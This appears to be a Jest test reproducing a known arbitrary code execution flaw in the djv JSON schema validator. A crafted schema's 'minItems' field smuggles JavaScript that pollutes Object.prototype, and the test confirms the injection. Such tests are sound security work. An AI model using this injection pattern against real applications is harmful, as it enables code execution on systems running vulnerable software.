//https://security.snyk.io/vuln/SNYK-JS-DJV-1014545
test("Arbitrary code execution in  djv", () => {
  const fs = require("fs");
  const djv = require("djv");
  const path = "./djv";

  //checking that its not present already
  file_exist = fs.existsSync(path);
  // expect(file_exist).toBe(false);

  try {
    const env = new djv();
    const evilSchema = JSON.parse(
      '{"common":{"type":"array", "minItems":"1 + (Object.prototype.polluted = `yes`)"}}'
    );
    env.addSchema("test", evilSchema);
    env.validate("test#/common", { type: "custom" });
  } catch (error) {
    console.log(error);
  }

  //checking that its created by after exploit.
  file_exist = fs.existsSync(path);
  expect({}.polluted).toBe("yes");

  //fs.unlink(path, function(err) {});//deleting the file after creation
});
